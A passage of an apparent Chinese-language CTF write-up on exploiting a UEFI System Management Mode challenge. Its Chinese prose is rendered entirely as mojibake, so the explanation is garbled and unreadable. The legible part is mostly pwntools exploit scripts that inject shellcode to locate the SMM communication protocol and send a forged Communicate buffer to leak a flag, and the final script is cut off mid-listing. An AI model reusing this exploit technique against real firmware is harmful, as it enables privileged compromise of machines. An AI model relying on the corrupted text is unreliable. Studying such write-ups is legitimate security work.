çš„ä½œç”¨æ˜¯ï¼šåœ¨UEFIç¯å¢ƒä¸­æŸ¥æ‰¾EFI SMMé€šä¿¡åè®®çš„å®ä¾‹ï¼Œå¹¶å°†è¯¥åè®®çš„æ¥å£æŒ‡é’ˆå­˜å‚¨åœ¨mSmmCommunicationå˜é‡ä¸­ï¼Œä»¥ä¾¿åç»­ä»£ç å¯ä»¥ä½¿ç”¨è¿™ä¸ªåè®®è¿›è¡Œç³»ç»Ÿç®¡ç†æ¨¡å¼çš„é€šä¿¡ã€‚å¦‚æœåè®®è¢«æˆåŠŸæ‰¾åˆ°ï¼Œå‡½æ•°è¿”å›çŠ¶æ€ç EFI_SUCCESSï¼›å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™è¿”å›ä¸€ä¸ªé”™è¯¯ç ã€‚</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æˆåŠŸåç¬¬ä¸‰ä¸ªå‚æ•°ä¼šå˜æˆä¸€ä¸ªåè®®çš„æ¥å£ï¼Œéšåæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£å»è°ƒç”¨ Communicateã€‚æ‰€ä»¥æˆ‘ä»¬ç›®æ ‡åˆå˜æˆäº†è°ƒç”¨ LocateProtocolã€‚è€Œ LocateProtocol æ˜¯ UEFI çš„ç³»ç»ŸæœåŠ¡ï¼Œæ˜¯ BootServices ç»“æ„ä½“çš„ä¸€ä¸ªæˆå‘˜å‡½æ•°ã€‚æ‰€ä»¥è°ƒç”¨é“¾ä¹Ÿå¾ˆæ¸…æ™°äº† EFI_SYSTEM_TABLE-&gt;BootServices-&gt;LocateProtocolã€‚ç†è®ºå¯è¡Œï¼Œå¹²äº† xdm  </p><p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜æ˜¯å¦‚ä½•æ‰¾ gEfiSmmCommunicationProtocolGuidï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°† Binexec.efi ç›´æ¥æ‹–è¿› ida é‡Œé¢çœ‹ä»–æ˜¯æ€ä¹ˆè°ƒç”¨ LocateProtocol çš„ï¼Œç„¶åç›´æ¥æ‰¾åˆ° gEfiSmmCommunicationProtocolGuidã€‚  </p><img src="/2024/12/14/uefi/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ‰¾è¿™ç©æ„å…¶å®ä¹Ÿæœ‰ç‚¹æŠ€å·§ï¼Œæˆ‘ä»¬ä¸éš¾çœ‹å‡º qword_103128 å¯¹åº”çš„æ˜¯ bootServiceï¼Œå› ä¸ºè¿™é‡Œæ˜¯ +320ï¼Œä¸€çœ‹å°±æ˜¯ LocateProtocol çš„åç§»ã€‚<br>è·å–åˆ° mSmmCommunicationåï¼Œå°±èƒ½é¡ºè—¤æ‘¸ç“œçš„è·å–åˆ° Communicate å‡½æ•°ã€‚  </p><p>è¿™é‡Œéœ€è¦ç‰¹åˆ«æ³¨æ„å‡½æ•°çš„ä¼ å‚æ–¹å¼ï¼Œä¸æ˜¯æˆ‘ä»¬å¹³æ—¶çš„ rdiã€rsiã€rdxã€rcxã€r8ã€r9â€¦â€¦  </p><img src="/2024/12/14/uefi/18.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è€Œæ˜¯ rcxã€rdxã€r8ã€r9ï¼Œå‰©ä½™å‚æ•°å¸ƒç½®åœ¨æ ˆä¸­  </p><p>æœ‰ Communicate äº†æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ª buffer æŒ‰é“ç†æ¥è¯´å°±å¯ä»¥è¾“å‡º 0x44440000 åœ°å€çš„ flag äº†ã€‚buffer ä¸­çš„ headerGuid æˆ‘ä»¬å¯ä»¥å’Œä¸Šé¢ä¸€æ ·çš„æ–¹æ³•æŠŠ SmmCowsay.efi ä¸¢è¿› ida é‡Œé¢æŸ¥æ‰¾ã€‚  </p><img src="/2024/12/14/uefi/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æœ€åå†™å‡ºæ¥çš„ exp å¦‚ä¸‹ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    lea rdx, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¯æ˜¯ä¸€è¿è¡Œä¼šå‘ç”ŸæŠ¥é”™ï¼š  </p><img src="/2024/12/14/uefi/19.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç”±äºæ˜¯åœ¨æ‰§è¡Œå®Œæœ€åä¸€æ®µ shellcode åæ‰å‡ºç°çš„æŠ¥é”™ï¼Œæˆ‘ä»¬ä¸éš¾åˆ¤æ–­é—®é¢˜å‡ºç°åœ¨ Communicate å‡½æ•°çš„è°ƒç”¨ï¼Œé€šè¿‡ rax æˆ‘ä»¬å¯ä»¥å‘ç°å…¶æŠ¥é”™ä»£ç ä¸º 0xf EFI_ACCESS_DENIEDï¼Œè®¿é—®æ‹’ç»ã€‚  </p><p>æŸ¥çœ‹æºç ä¸­å¯¹è¿™ä¸ªæŠ¥é”™ä»£ç çš„è§£é‡Šï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Communicates with a registered handler.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  This function provides a service to send and receive messages from a registered</span></span><br><span class="line"><span class="comment">  UEFI service.  This function is part of the SMM Communication Protocol that may</span></span><br><span class="line"><span class="comment">  be called in physical mode prior to SetVirtualAddressMap() and in virtual mode</span></span><br><span class="line"><span class="comment">  after SetVirtualAddressMap().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param[in] This                The EFI_SMM_COMMUNICATION_PROTOCOL instance.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommBuffer     A pointer to the buffer to convey into SMRAM.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommSize       The size of the data buffer being passed in. On exit, the size of data</span></span><br><span class="line"><span class="comment">                                 being returned. Zero if the handler does not wish to reply with any data.</span></span><br><span class="line"><span class="comment">                                 This parameter is optional and may be NULL.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @retval EFI_SUCCESS            The message was successfully posted.</span></span><br><span class="line"><span class="comment">  @retval EFI_INVALID_PARAMETER  The CommBuffer was NULL.</span></span><br><span class="line"><span class="comment">  @retval EFI_BAD_BUFFER_SIZE    The buffer is too large for the MM implementation.</span></span><br><span class="line"><span class="comment">                                 If this error is returned, the MessageLength field</span></span><br><span class="line"><span class="comment">                                 in the CommBuffer header or the integer pointed by</span></span><br><span class="line"><span class="comment">                                 CommSize, are updated to reflect the maximum payload</span></span><br><span class="line"><span class="comment">                                 size the implementation can accommodate.</span></span><br><span class="line"><span class="comment">  @retval EFI_ACCESS_DENIED      The CommunicateBuffer parameter or CommSize parameter,</span></span><br><span class="line"><span class="comment">                                 if not omitted, are in address range that cannot be</span></span><br><span class="line"><span class="comment">                                 accessed by the MM environment.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">SmmCommunicationCommunicate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT VOID                              *CommBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT UINTN                             *CommSize OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span>;</span><br></pre></td></tr></table></figure><p>CommunicateBuffer ä½äº SMM ç¯å¢ƒæ— æ³•è®¿é—®çš„åœ°å€èŒƒå›´å†…ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è”æƒ³åˆ°æˆ‘ä»¬ä¸Šä¸€é¢è®²è¿‡çš„ä¸€ä¸ªç¼“å†²åŒºæ£€æŸ¥çš„å‡½æ•° SmmIsBufferOutsideSmmValidï¼Œå› ä¸ºæˆ‘ä»¬çš„ Buffer ä½äºæˆ‘ä»¬è¾“å…¥ shellcode çš„é‚£ä¸ªåœ°å€ç©ºé—´ï¼Œå¿…ç„¶ä¸ç¬¦åˆè¦æ±‚ã€‚é‚£åŸæ¥çš„ç¨‹åºçš„ Buffer æ˜¯åœ¨ä»€ä¹ˆåœ°æ–¹æˆ–è€…è¯´æ˜¯æ€ä¹ˆç”³è¯·çš„å‘¢ï¼Ÿæˆ‘ä»¬ç»§ç»­çœ‹é¢˜ç›®ä»£ç ï¼š  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = sizeof(CHAR16 *);</span></span><br><span class="line"><span class="addition">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç° Buffer æ˜¯é€šè¿‡ AllocateRuntimeZeroPool å‡½æ•°ç”³è¯·å‡ºæ¥çš„ï¼Œæˆ‘ä»¬ç»§ç»­çœ‹è¿™ä¸ªå‡½æ•°ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Allocates and zeros a buffer of type EfiRuntimeServicesData. &lt;======åˆ†é…çš„dataçš„ç±»å‹</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Allocates the number bytes specified by AllocationSize of type EfiRuntimeServicesData, clears the</span></span><br><span class="line"><span class="comment">  buffer with zeros, and returns a pointer to the allocated buffer.  If AllocationSize is 0, then a</span></span><br><span class="line"><span class="comment">  valid buffer of 0 size is returned.  If there is not enough memory remaining to satisfy the</span></span><br><span class="line"><span class="comment">  request, then NULL is returned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  AllocationSize        The number of bytes to allocate and zero.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return A pointer to the allocated buffer or NULL if allocation fails.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">VOID *</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">AllocateRuntimeZeroPool</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN UINTN  AllocationSize</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">InternalAllocateZeroPool</span> (EfiRuntimeServicesData, AllocationSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾ gpt è€å¸ˆé—®äº†ä¸€ä¸‹è¿™ä¸ªå‡½æ•°åœ¨å¹²ä»€ä¹ˆï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return InternalAllocateZeroPool (EfiRuntimeServicesData, AllocationSize);: è¿™è¡Œä»£ç è°ƒç”¨äº† InternalAllocateZeroPool å‡½æ•°ï¼Œå¹¶å°†è¿”å›å€¼ç›´æ¥è¿”å›ç»™è°ƒç”¨è€…ã€‚InternalAllocateZeroPool æ˜¯ä¸€ä¸ªå†…éƒ¨å‡½æ•°ï¼Œå®ƒè´Ÿè´£å®é™…åˆ†é…å†…å­˜ã€‚ç¬¬ä¸€ä¸ªå‚æ•° EfiRuntimeServicesData æ˜¯ä¸€ä¸ªæšä¸¾å€¼ï¼ŒæŒ‡å®šäº†å†…å­˜åº”è¯¥ä»UEFIè¿è¡Œæ—¶æœåŠ¡çš„æ•°æ®åŒºåŸŸåˆ†é…ã€‚ç¬¬äºŒä¸ªå‚æ•° AllocationSize æ˜¯å‰é¢æåˆ°çš„è¦åˆ†é…çš„å†…å­˜å¤§å°ã€‚  </span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ Buffer åº”è¯¥æ˜¯ä¸€ä¸ª EfiRuntimeServicesData ç±»å‹çš„åœ°å€ç©ºé—´ã€‚  </p><img src="/2024/12/14/uefi/20.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä»å®˜æ–¹æ–‡æ¡£å¯ä»¥çŸ¥é“è¯¥æšä¸¾å€¼ä¸º 6ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¾ˆæ¸…æ¥šäº†ï¼Œç”³è¯·ä¸€å— EfiRuntimeServicesData ç±»å‹çš„åœ°å€ç©ºé—´å¹¶å†™ä¸Šæˆ‘ä»¬ä¼ªé€ çš„ Bufferï¼Œå…¶ä»–æ“ä½œå’Œå‰é¢ä¸€ç›´å³å¯ã€‚å¯æ˜¯æˆ‘ä»¬æ²¡æ³•ç”¨å·²æœ‰çš„ä¸œè¥¿ç›´æ¥è°ƒç”¨ AllocateRuntimeZeroPoolï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ç±»ä¼¼çš„å‡½æ•°æ›¿ä»£ï¼ŒBootServices-&gt;AllocatePool() å’Œ BootServices-&gt;AllocatePages()éƒ½è¡Œã€‚åªè¦åˆ†é…çš„ç±»å‹æ˜¯ EfiRuntimeServicesData å°±è¡Œã€‚æ­¤å¤„ä½¿ç”¨BootServices-&gt;AllocatePool() è¿›è¡Œåˆ†é…ã€‚  </p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>æœ€ç»ˆ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span 